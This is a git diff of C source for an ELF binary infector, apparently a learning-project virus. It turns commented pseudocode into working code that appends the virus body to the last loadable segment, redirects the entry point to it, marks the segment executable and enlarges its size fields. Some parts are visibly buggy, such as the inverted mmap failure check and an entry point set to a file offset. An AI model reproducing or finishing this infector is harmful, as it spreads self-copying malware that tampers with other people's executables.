@@ -12,42 +12,64 @@
 // 	return FALSE;
 // }
 
-// void *extend_memory(file, file_size, phdr, VIRUS_SIZE)
-// {
+void *extend_memory(void *file, size_t file_size, Elf64_Phdr *phdr)
+{
+	int space_available = file_size - (phdr->p_offset + phdr->p_filesz);
+	int space_missing = space_available - VIRUS_SIZE;
+	void *new_file = file;
 
-// 	int space_available = file_size - (phdr->offset + phdr->size);
-// 	int space_missing = space_available - VIRUS_SIZE;
-// 	if space_missing < 0:
-// 		new_file = mmap(space_missing);
-// 		memcopy(new_file, file, file_size);
-// 	return new_file;
-// }
+	if (space_missing < 0)
+	{
+		printf("Missing %d octets\n", space_missing);
+		if ((new_file = mmap(NULL,
+							 file_size + space_missing,
+							 PROT_READ | PROT_WRITE,
+							 MAP_PRIVATE,
+							 0,
+							 0)) == MAP_FAILED)
+			memmove(new_file, file, file_size);
+		munmap(file, file_size);
+	}
+
+	return new_file;
+}
 
 uint8_t	*infect_file(void *file, size_t file_size, void *start_virus)
 {
-	printf("%s\n", __func__);
+	Elf64_Phdr *phdr;
+
+		printf("%s\n", __func__);
 	(void)start_virus;
 	if (check_elf_header(file, file_size) == FAILURE)
 		return NULL;
 	printf("ELF Hdr is OK\n");
 	// Check if file is good, and find last loadable segment
-	Elf64_Phdr *phdr = find_phdr(file, file_size);
+	phdr = find_phdr(file, file_size);
 	if (phdr == NULL)
 		return NULL;
+	printf("Phdr found\n");
 	// // Check if file already taken care of
 	// if (check_if_not_infected(start_virus, phdr + phdr->offset - VIRUS_SIZE))
 	// 	return NULL;
-	// // Extend file size if necessary
-	// file = extend_memory(file, file_size, phdr, VIRUS_SIZE);
-	// if (file == NULL)
-	// 	return NULL;
-	// // Find again the phdr
-	// elfphdr *phdr = find_phdr(file, file_size);
-	// // Inject self in file
-	// spot = file + (phdr->offset + phdr->size);
-	// memcopy(spot, start_virus, VIRUS_SIZE);
-	// file->e_entry = spot;
-	// phdr->rights += EXECUTE;
-	// phdr->size += VIRUS_SIZE;
+
+	// Extend file size if necessary
+	file = extend_memory(file, file_size, phdr);
+	if (file == NULL)
+		return NULL;
+	printf("Extended\n");
+
+	// Find again the phdr
+	phdr = find_phdr(file, file_size);
+	printf("Phdr found\n");
+
+	// Inject self in file
+	void *spot;
+	spot = file + (phdr->p_offset + phdr->p_filesz);
+	memmove(spot, start_virus, VIRUS_SIZE);
+	((Elf64_Ehdr *)file)->e_entry = (phdr->p_offset + phdr->p_filesz);
+	phdr->p_flags |= PF_X;
+	phdr->p_filesz += VIRUS_SIZE;
+	phdr->p_memsz += VIRUS_SIZE;
+	printf("Infected\n");
 	return file;
 }
